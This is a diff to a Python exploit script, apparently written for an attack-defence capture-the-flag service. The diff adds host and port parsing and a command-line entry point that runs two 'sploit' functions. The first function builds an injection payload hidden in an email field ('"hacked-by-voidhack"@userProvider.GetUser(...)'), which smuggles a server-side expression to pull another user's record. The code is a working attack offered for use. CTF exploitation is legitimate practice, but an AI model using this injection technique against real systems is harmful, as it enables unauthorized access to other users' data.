@@ -1,4 +1,5 @@
 import re
+import sys
 
 from client import Client
 from data import get_random_creds, get_park_request, get_random_document
@@ -9,11 +10,17 @@ from pretty_client import PrettyClient
 def generate_email_payload(user_id):
     parts = ",".join([f"(char){ord(x)}" for x in user_id])
     guid_payload = f"Guid.Parse(new[]{{{parts}}})"
-    return f"\"hacked-by-voidhack\"@userProvider.GetUser({guid_payload})"
+    return f"\"hacked-by-voidhack\"@userProvider.GetUser({guid_payload})"\
+
+
+def get_host_port(hostname):
+    parts = hostname.split(":", 2)
+    return parts[0], int(parts[1] if len(parts) > 1 else 7777)
 
 
 def first_sploit(hostname, user_id):
-    native_client = Client(hostname, 7777)
+    host, port = get_host_port(hostname)
+    native_client = Client(host, port)
     client = PrettyClient(native_client)
 
     login, password = get_random_creds()
@@ -30,7 +37,8 @@ def first_sploit(hostname, user_id):
 
 
 def second_sploit(hostname, park_id, attraction_id):
-    client = PrettyClient(Client(hostname, 7777))
+    host, port = get_host_port(hostname)
+    client = PrettyClient(Client(host, port))
 
     login, password = get_random_creds()
     register_request = RegisterRequest(login=login, password=password, document=get_random_document())
@@ -50,8 +58,13 @@ def second_sploit(hostname, park_id, attraction_id):
 
 
 def main():
-    # print(first_sploit("localhost", "51b87cf6-e768-4040-9682-06286ab6cabb"))
-    # print(second_sploit("localhost", "ec5d6db0-5d42-4200-8d81-8068689cc241", "885a0617-0b5b-4791-891d-5f899089bcc5"))
+    if len(sys.argv) < 2:
+        print(f"usage: python {sys.argv[0]} localhost[:7777]")
+        return
+
+    hostname = sys.argv[1]
+    print(first_sploit(hostname, "2868a3f5-6229-4b4b-b68c-65f6068132fb"))
+    print(second_sploit(hostname, "493675f3-69ad-4fc6-bef4-9c1bed3a6ae3", "63f6ea4e-67fb-4406-860f-05b19b55420a"))
     pass
 
 
